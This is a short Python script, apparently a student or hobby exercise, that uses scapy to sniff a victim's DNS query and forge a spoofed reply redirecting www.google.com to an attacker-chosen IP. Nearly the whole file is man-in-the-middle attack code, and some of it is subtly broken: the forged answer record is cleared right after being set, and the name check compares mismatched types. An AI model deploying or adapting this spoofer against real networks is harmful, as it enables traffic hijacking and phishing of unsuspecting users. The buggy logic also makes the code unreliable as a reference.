from scapy.all import *

ipVictim = '255.255.255.255' # The IP address of the victim
goodSite = 'www.google.com' # The website we want to redirect them from
evilSite = '255.255.255.255' # The IP address we want to redirect the victim to
    
def dns_req_test() : # This function is used to see if the packets we send out are correct
    dns_packet2 = IP(dst='8.8.8.8') / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname='www.google.com'))
    # dns_packet2.show()
    send(dns_packet2)
    
    
def sniffPKT(ipVictim, goodSite) :
    pkt = sniff(lfilter=lambda p: p.haslayer(UDP) and p.dport == 53, filter='host ' + ipVictim, count=1, prn=lambda x: x.show())
    if pkt[0][DNSQR].qname == goodSite :
        return pkt[0]
    else :
        return pkt[0]
    
def MIMspoofDNS(pkt, goodSite, evilSite) :
    EvilDNSResponse = IP() / UDP() / DNS()
    EvilDNSResponse[IP].dst = pkt[IP].src
    EvilDNSResponse[IP].src = pkt[IP].dst
    EvilDNSResponse[UDP].dport = pkt[UDP].sport
    EvilDNSResponse[UDP].sport = pkt[UDP].dport
    EvilDNSResponse[DNS].rd = pkt[DNS].rd
    EvilDNSResponse[DNS].qd = pkt[DNS].qd
    EvilDNSResponse[DNS].qr = 1
    EvilDNSResponse[DNS].an = DNSRR(rrname = goodSite, rdata = evilSite)
    EvilDNSResponse[DNS].an = None
    EvilDNSResponse.show()
    send(EvilDNSResponse)
    
# def testSniffnExtract() :
#     pkt = sniff(filter='host 8.8.8.8', session = IPSession, count=1, prn=lambda x: x.show())
#     pkt[0].show()
    
    
def main() :
    # dns_req_test()
    pkt = sniffPKT(ipVictim, goodSite)
    MIMspoofDNS(pkt, goodSite, evilSite)
    # print("Test Success")

main()
